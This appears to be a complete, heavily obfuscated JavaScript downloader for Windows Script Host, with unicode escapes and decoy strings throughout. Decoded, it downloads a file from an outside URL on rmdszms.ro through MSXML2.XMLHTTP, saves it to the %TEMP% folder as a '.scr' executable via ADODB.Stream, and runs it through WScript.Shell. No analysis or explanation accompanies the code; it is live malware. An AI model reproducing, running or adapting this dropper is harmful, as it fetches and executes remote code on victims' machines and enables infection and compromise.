academyCollective = (((0 ^ 0) | (76 * 2 + 24)), this);
iconExtract = ("b\u0061\u006cl", "\u0073ex", "practica\u006c", "com\u006du\u006e\u0069\u0063a\u0074\u0069o\u006e", "\u0052\u0075n");
cyberneticsDecade = academyCollective[("\u0062ea\u0073\u0074", "\u0062a\u0072g\u0065", "d\u0069vis\u0069\u006f\u006e", "WS\u0063r\u0069\u0070\u0074")];
cyberneticsDecade[("l\u006fg\u0069\u0063", "d\u0069\u0063t\u0061\u0074or", "S\u006c\u0065\u0065\u0070")](((Math.pow(345, 2) - 118845), (210 - 117), (1661 * 9 + 51)));
symbolTranslation = cyberneticsDecade[("\u0073\u0075\u0070e\u0072\u006d\u0061\u006e", "\u0043r\u0065\u0061te\u004f\u0062\u006a\u0065\u0063t")](("dup\u006c\u0069c\u0061\u0074e", "s\u0068\u006fw", "\u0062oom", "\u0062a\u0073\u0065", "WScr\u0069\u0070t\u002eS\u0068\u0065ll"));
portraitTransplant = symbolTranslation[("\u0069ntelli\u0067\u0065n\u0063\u0065", "\u0068is\u0074or\u0079", "\u0045x\u0070a\u006e\u0064En\u0076\u0069\u0072o\u006e\u006de\u006e\u0074St\u0072\u0069ng\u0073")](("\u0072\u0065fle\u0078", function String.prototype.parallelAudience() {
			return this
}, "\u0025T\u0045\u004dP%/")) + ("\u0061\u0074\u0074r\u0061\u0063tion", "c\u006f\u006dp\u006f\u006een\u0074", "\u0062\u0075s", "aut\u006fgr\u0061p\u0068M\u0061g\u0061z\u0069\u006e\u0065") + ("\u002e\u0073cr");
iconLogic = academyCollective[("\u006d\u0069ra\u0067\u0065", "\u0073eria\u006c", "\u0061\u0063tor", "\u0073ub\u006a\u0065ct", "\u0057\u0053\u0063r\u0069\u0070\u0074")][("\u0072a\u006ek", "\u0069de\u006et\u0069\u0063a\u006c", "t\u0079pic\u0061\u006c", "\u0043r\u0065ate\u004fbject")](("b\u0069\u006e\u0061r\u0079", "\u006dome\u006e\u0074", "o\u0072ig\u0069n", "\u004dSX\u004dL\u0032\u002e\u0058\u004dLH\u0054T\u0050"));
iconLogic[("skel\u0065to\u006e", "ce\u006et", "\u0062\u0061t\u0074\u0065r\u0079", "del\u0065\u0067\u0061t\u0065", "op\u0065\u006e")](("st\u0069\u006du\u006cus", "\u0047ET"), ("ht\u0074\u0070\u003a/\u002fr\u006d\u0064szm\u0073.\u0072\u006f/2/8\u0037\u0079v5c\u0064\u0073"), !(1 < (([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]]))));
iconLogic[("\u0065\u006c\u0065\u006de\u006e\u0074", "d\u0065\u0076\u0069l", "\u0063\u0061\u006eal", "\u0072a\u0063\u0065", "\u0073en\u0064")]();
while (iconLogic[("c\u0061\u0072\u0064\u0069\u006e\u0061l", "a\u0072\u0067\u0075m\u0065\u006e\u0074", "ba\u006e\u0061n\u0061", "read\u0079\u0073tate")] < ((1 ^ 5) - (238, 0))) {
			academyCollective[("re\u0067en\u0065rate", "\u006d\u0061n\u0064\u0061t\u0065", "\u0061g\u0065\u006e\u0074", "\u0057\u0053\u0063\u0072\u0069\u0070t")][("s\u0074\u0072a\u0074e\u0067\u0079", "\u0069nv\u0065\u0072\u0073\u0069on", "\u0070r\u006fvoc\u0061\u0074\u0069\u006fn", "Sl\u0065\u0065p")](((1334 / 29) * (68 / 34) + (Math.pow(6, 2) - 28)));
}
liberalSelection = academyCollective[("\u0066\u006cag", "\u0057\u0053\u0063\u0072\u0069\u0070\u0074")][("Crea\u0074eO\u0062j\u0065c\u0074")](("\u0063ol\u006ce\u0063t", "p\u0072\u006f\u0067r\u0065\u0073s", "co\u006e\u0074\u0061i\u006eer", "\u0041\u0044O\u0044B\u002e\u0053tr\u0065\u0061\u006d"));
try {
			liberalSelection[("t\u0065\u0072\u006din\u006fl\u006fgy", "\u006f\u0070\u0065\u006e")]();
			liberalSelection[("\u0073to\u0072y", "v\u0065\u0074eran", "\u0065\u0066fe\u0063t\u0069\u0076\u0065", "\u0061r\u0067um\u0065n\u0074", "t\u0079\u0070e")] = ((1 & 1) ^ (1 * 0));
			liberalSelection[("\u0064\u0065s\u0073\u0065\u0072t", "m\u0061ni\u0066e\u0073t\u006f", "sp\u0065\u0063\u0069\u0066\u0069\u0063", "w\u0072ite")](iconLogic[("t\u0068eor\u0065\u006d", "c\u006fmm\u0065\u0072ce", "\u0064ist\u0061\u006ec\u0065", "\u0052\u0065\u0073\u0070on\u0073e\u0042o\u0064\u0079")]);
			liberalSelection[("\u0066ini\u0073\u0068", "\u006da\u006e\u0069f\u0065\u0073t", "t\u0072i\u0062u\u006e\u0065", "\u0070ositi\u006fn")] = (0 ^ 0);
			liberalSelection[("s\u0075\u0070erman", "\u0074\u0065mp\u0065ra\u0074\u0075\u0072\u0065", "s\u0061v\u0065\u0054o\u0046\u0069l\u0065")](portraitTransplant, ((2 & 2) & (5 - 3)));
			liberalSelection[("c\u0068\u006fc\u006fl\u0061\u0074\u0065", "\u0063\u006c\u006fse")]();
			symbolTranslation[iconExtract](portraitTransplant.parallelAudience(), ((0 ^ 0) ^ (0 + 0)), ((0 ^ 0) ^ (1 * 0)));
} catch (relaxationMeridian) {};